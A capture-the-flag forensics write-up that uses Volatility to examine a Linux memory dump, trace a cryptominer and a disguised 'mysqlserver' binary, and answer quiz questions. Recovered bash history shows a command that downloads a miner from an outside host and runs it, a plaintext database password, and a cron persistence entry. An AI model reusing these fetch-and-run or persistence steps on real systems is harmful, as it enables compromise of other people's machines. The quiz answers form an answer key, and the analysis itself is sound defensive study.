# Tooling: Volatility

Add Ubuntu profile
```bash
cd ~/Desktop/Evidence
cp Ubuntu_5.4.0-163-generic_profile.zip ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/
```

Read .bash_history
```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_bash
```
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    8092 bash                 2023-10-02 18:13:46 UTC+0000   sudo su
    8092 bash                 2023-10-02 18:15:44 UTC+0000   git clone https://github.com/504ensicsLabs/LiME && cd LiME/src/
    8092 bash                 2023-10-02 18:15:53 UTC+0000   ls
    8092 bash                 2023-10-02 18:15:55 UTC+0000   make
    8092 bash                 2023-10-02 18:16:16 UTC+0000   vi ~/.bash_history 
    8092 bash                 2023-10-02 18:16:38 UTC+0000    
    8092 bash                 2023-10-02 18:16:38 UTC+0000   ls -la /home/elfie/
    8092 bash                 2023-10-02 18:16:42 UTC+0000   sudo su
    8092 bash                 2023-10-02 18:18:38 UTC+0000   ls -la /home/elfie/
    8092 bash                 2023-10-02 18:18:41 UTC+0000   vi ~/.bash_history 
   10205 bash                 2023-10-02 18:19:58 UTC+0000   mysql -u root -p'NEhX4VSrN7sV'
   10205 bash                 2023-10-02 18:19:58 UTC+0000   id
   10205 bash                 2023-10-02 18:19:58 UTC+0000   curl http://10.0.2.64/toy_miner -o miner
   10205 bash                 2023-10-02 18:19:58 UTC+0000   ./miner
   10205 bash                 2023-10-02 18:19:58 UTC+0000   cat /home/elfie/.bash_history
   10205 bash                 2023-10-02 18:20:03 UTC+0000   vi .bash_history 
   10205 bash                 2023-10-02 18:21:21 UTC+0000   cd LiME/src/

Read pslist
```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_pslist
```
0xffff9ce9b1e4c680 miner                10280           1               1000            1000   0x0000000074fa2000 2023-10-02 18:22:37 UTC+0000
0xffff9ce9bc23af00 mysqlserver          10291           1               1000            1000   0x000000006f166000 2023-10-02 18:22:37 UTC+0000
PIDs: mysqlserver: 10291, miner: 10280

Extract processes
```bash
mkdir extracted
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -p 10280 -D extracted
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -p 10291 -D extracted
```
Get MD5 hashes
```bash
md5sum extracted/miner.10280.0x400000
md5sum extracted/mysqlserver.10291.0x400000
```
153a5c8efe4aa3be240e5dc645480dee  extracted/miner.10280.0x400000
c586e774bb2aa17819d7faae18dad7d1  extracted/mysqlserver.10291.0x400000

Extract files
```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_enumerate_files | grep -i cron
```
0xffff9ce9b78280e8                    132687 /var/spool/cron/crontabs/elfie

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_find_file -i 0xffff9ce9b78280e8 -O elfie
cat elfie
```
```
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (- installed on Mon Oct  2 18:22:12 2023)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
*/8 * * * * /var/tmp/.system-python3.8-Updates/mysqlserver
```

# What is the exposed password that we find from the bash history output?
NEhX4VSrN7sV

# What is the PID of the miner process that we find?
10280

# What is the MD5 hash of the miner process?
153a5c8efe4aa3be240e5dc645480dee

# What is the MD5 hash of the mysqlserver process?
c586e774bb2aa17819d7faae18dad7d1

# Use the command strings extracted/miner.<PID from question 2>.0x400000 | grep http://. What is the suspicious URL? (Fully defang the URL using CyberChef)
`strings extracted/miner.10280.0x400000 | grep http://`
http://mcgreedysecretc2.thm
defanged: 
hxxp[://]mcgreedysecretc2[.]thm

# After reading the elfie file, what location is the mysqlserver process dropped in on the file system?
/var/tmp/.system-python3.8-Updates/mysqlserver
